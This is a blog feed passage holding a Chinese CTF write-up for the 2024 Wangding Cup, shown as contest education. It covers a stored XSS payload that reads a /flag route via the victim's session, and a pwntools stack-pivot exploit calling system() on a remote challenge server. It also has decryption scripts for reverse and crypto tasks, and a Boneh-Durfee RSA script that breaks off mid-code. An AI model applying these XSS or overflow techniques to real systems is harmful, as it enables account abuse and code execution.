    <category term="Active Directory" scheme="https://ya1orin.github.io/tags/Active-Directory/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯 青龙组 2024</title>
    <link href="https://ya1orin.github.io/posts/f29ac13a.html"/>
    <id>https://ya1orin.github.io/posts/f29ac13a.html</id>
    <published>2024-10-30T10:03:36.000Z</published>
    <updated>2024-10-30T10:10:14.079Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1>WEB</h1><h2 id="WEB02：">WEB02：</h2><p>访问该环境，登陆注册能随便登，会返回一个/content/hash作为路由，然后拿dirsearch扫一下只能发现一个flag路由，回显你是boss嘛？就想看其他无人机拟定执行任务？</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180453448-634328005.png" alt="image-20241030180447239"></p><p>进这个路由之后有3按钮，提交，刷新，和更新，一开始一直在试拿fenjing梭ssti，然后不成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180459681-135067479.png" alt="image-20241030180453738"></p><p>之后尝试写xss，发现存在存储型xss，之后尝试拿hackbar的xss一把梭一下，想弹到ceye.io上，咋弹都回显那个不是boss，我还以为是payload有问题，以为是要弹到当前路由</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180509840-252441728.png" alt="image-20241030180503515"></p><p>之后看响应包，突然发现他的提交是点击提交当前页面，boss会审核你的起飞任务清单，所以使用submit提交后，就是直接boss审核的</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180524353-506826609.png" alt="image-20241030180518438"></p><p>所以最后是需要我们把xss payload存储之后，点击submit，就是由boss提交的，然后就能把flag路由的回显输出到当前页面了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180530487-2088539579.png" alt="image-20241030180524536"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">fetch</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;/content/2f9f1f36782a270b689d8c0f3e9e08df&#x27;</span>,&#123;</span><br><span class="line">      <span class="attr">method</span>:<span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">      <span class="attr">headers</span>:&#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;,</span><br><span class="line">      <span class="attr">body</span>:<span class="string">&quot;content=123&quot;</span>%2bdata</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">  &lt;/script&gt;</span><br></pre></td></tr></table></figure><h1>PWN</h1><h2 id="PWN02">PWN02</h2><p>首先是一个login的登录绕过，直接按照它的要求输就好了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180537716-735995572.png" alt="image-20241030180532038"></p><p>然后过到下面的vuln函数中去打溢出，这边眼瞅着的长度肯定不够，首先想到打栈迁移,给出后续地址之后直接打</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180542217-1925355468.png" alt="image-20241030180536624"></p><p>然后看到有给出完整后门，那么就好打了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180549697-1876912266.png" alt="image-20241030180544198"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180554685-1109696381.png" alt="image-20241030180549098"></p><p>直接栈迁移打system</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180600784-1355890361.png" alt="image-20241030180554897"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&quot;./pwn&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;0192d6192424783193117245846d79b9.8nz7.dg02.ciihw.cn&quot;</span>,<span class="number">44958</span>)</span><br><span class="line">sh_address=<span class="number">0x0804A038</span></span><br><span class="line">ret_address=<span class="number">0x08048674</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter your username: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;admin\x00&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter your password: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;admin123\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">stac = <span class="built_in">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stac))</span><br><span class="line"></span><br><span class="line">payload = (p32(<span class="number">0x080485E6</span>)+p32(<span class="number">0</span>)+p32(sh_address)).ljust(<span class="number">80</span>,<span class="string">b&quot;\x00&quot;</span>)+p32(stac-<span class="number">4</span>)+p32(ret_address)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;plz input your msg:\n&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1>REVERSE</h1><h2 id="REVERSE01">REVERSE01</h2><p>安卓题，有混淆，先找MainActivity，锁定主要逻辑如下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180611619-2052552002.png" alt="image-20241030180605900"></p><p>主要就是跟其中的check方法，发现是native层加密逻辑</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180616027-127520718.png" alt="image-20241030180610625"></p><p>那么直接解包apk去看逻辑，逻辑也相对清晰，主要加密逻辑有点眼熟，过一下gpt得知确实是sm4</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180623464-1322363819.png" alt="image-20241030180617201"></p><p>那么直接找key嗦一把试试</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180630567-2040125301.png" alt="image-20241030180625061"></p><p>注意后面的这个Z0099864的赋值有个端序问题，做一个倒序就好</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180638144-1936208116.png" alt="image-20241030180632275"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data=<span class="string">&quot;Z0099864&quot;</span></span><br><span class="line"><span class="built_in">print</span>(data[::-<span class="number">1</span>])</span><br><span class="line"><span class="comment">#4689900Z</span></span><br></pre></td></tr></table></figure><p>拼接起来之后把密文提取出来直接解SM4，跟进变量提取密文</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180642384-967731827.png" alt="image-20241030180636886"></p><p>最终解出flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180646848-1493421369.png" alt="image-20241030180641293"></p><h2 id="REVERSE02">REVERSE02</h2><p>逻辑什么的都相当清楚了，然后结合题目给的信息，顾名思义四段加密</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180656646-1243407274.png" alt="image-20241030180651066"></p><p>第一段是乘以2</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180702111-692318069.png" alt="image-20241030180656553"></p><p>第二段是异或</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180705623-1786287139.png" alt="image-20241030180700192"></p><p>第三段是自定义码表的一个base64</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180710945-1425284552.png" alt="image-20241030180705465"></p><p>第四段是解一个AES</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180716007-858819302.png" alt="image-20241030180710249"></p><p><strong>EXP：</strong></p><p>其中第三段解base64的结果为</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180729798-926729124.png" alt="image-20241030180723965"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">s2=[<span class="number">0x70</span>,<span class="number">0xCC</span>,<span class="number">0x62</span>,<span class="number">0xCA</span>,<span class="number">0x60</span>,<span class="number">0x6E</span>,<span class="number">0x6C</span>,<span class="number">0x6C</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;part1:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s2)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">round</span>(s2[i]/<span class="number">2</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># #part1:81fe0766</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data=[<span class="number">0x69</span>,<span class="number">0x56</span>,<span class="number">0x45</span>,<span class="number">0x17</span>,<span class="number">0x7D</span>,<span class="number">0x0D</span>,<span class="number">0x11</span>,<span class="number">0x52</span>]</span><br><span class="line">xor_key=<span class="string">&quot;XorrLord&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\npart2:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(xor_key)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(data[i]^<span class="built_in">ord</span>(xor_key[i])),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#part2:197e1bc6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#part3:809832f4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;AesMasterAesMast&quot;</span>  </span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v4 = <span class="built_in">bytes</span>([<span class="number">251</span>, <span class="number">217</span>, <span class="number">179</span>, <span class="number">171</span>, <span class="number">217</span>, <span class="number">136</span>, <span class="number">230</span>, <span class="number">11</span>, <span class="number">147</span>, <span class="number">124</span>, <span class="number">149</span>, <span class="number">235</span>, <span class="number">148</span>, <span class="number">219</span>, <span class="number">11</span>, <span class="number">84</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 AES ECB 模式解密 v4</span></span><br><span class="line">decrypted_data = cipher.decrypt(v4)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\npart4:&quot;</span>, decrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#par4:d346fe66</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拼接起来得到最终的flag为<code>wdflag&#123;81fe0766197e1bc6809832f4d346fe66&#125;</code></p><h1>CRYPTO</h1><h2 id="CRYPTO02">CRYPTO02</h2><p>直接上网搜索，找到原题</p><p><a href="https://www.cnblogs.com/mumuhhh/p/17789591.html">https://www.cnblogs.com/mumuhhh/p/17789591.html</a></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180739183-1151293321.png" alt="image-20241030180733303"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180744278-69578574.png" alt="image-20241030180738691"></p><p>根据给出的脚本进行解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">time.clock = time.time</span><br><span class="line"> </span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># 如果晶格达到该尺寸，则停止移除</span></span><br><span class="line"><span class="comment"># 显示有用矢量的统计数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">    <span class="built_in">print</span> (nothelpful, <span class="string">&quot;/&quot;</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">&quot; vectors are not helpful&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示带有 0 和 X 的矩阵</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_overview</span>(<span class="params">BB, bound</span>):</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>: </span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">&#x27;~&#x27;</span></span><br><span class="line">        <span class="comment">#print (a)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试删除无用的向量</span></span><br><span class="line"><span class="comment"># 从当前 = n-1（最后一个向量）开始</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span><br><span class="line">    <span class="comment"># 我们从当前 = n-1（最后一个向量）开始</span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 开始从后面检查</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment">#  如果它没有用</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">             <span class="comment"># 让我们检查它是否影响其他向量</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># 如果另一个向量受到影响：</span></span><br><span class="line">                <span class="comment"># 我们增加计数</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># 等级：0</span></span><br><span class="line">            <span class="comment"># 如果没有其他载体最终受到影响</span></span><br><span class="line">            <span class="comment"># 我们删除它</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="comment">#print (&quot;* removing unhelpful vector&quot;, ii)</span></span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line">           <span class="comment"># 等级：1</span></span><br><span class="line">            <span class="comment">#如果只有一个受到影响，我们会检查</span></span><br><span class="line">            <span class="comment"># 如果它正在影响别的向量</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># 如果它影响哪怕一个向量</span></span><br><span class="line">                    <span class="comment"># 我们放弃这个</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># 如果没有其他向量受到影响，则将其删除，并且</span></span><br><span class="line">                <span class="comment"># 这个有用的向量不够有用</span></span><br><span class="line">                <span class="comment">#与我们无用的相比</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> <span class="built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="built_in">abs</span>(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="comment">#print (&quot;* removing unhelpful vectors&quot;, ii, &quot;and&quot;, affected_vector_index)</span></span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1，-1 如果 &quot;strict=true&quot;，并且行列式不受约束</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> 在以下情况下找到解决方案：</span></span><br><span class="line"><span class="string">* d &lt; N^delta</span></span><br><span class="line"><span class="string">* |x|&lt; e^delta</span></span><br><span class="line"><span class="string">* |y|&lt; e^0.5</span></span><br><span class="line"><span class="string">每当 delta &lt; 1 - sqrt（2）/2 ~ 0.292</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)   <span class="comment">#多项式环</span></span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u)        <span class="comment">#  u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"> </span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># x-移位</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 单项式 x 移位列表</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials(): <span class="comment">#对于多项式中的单项式。单项式（）：</span></span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:  <span class="comment"># 如果单项不在单项中</span></span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># y-移位</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span 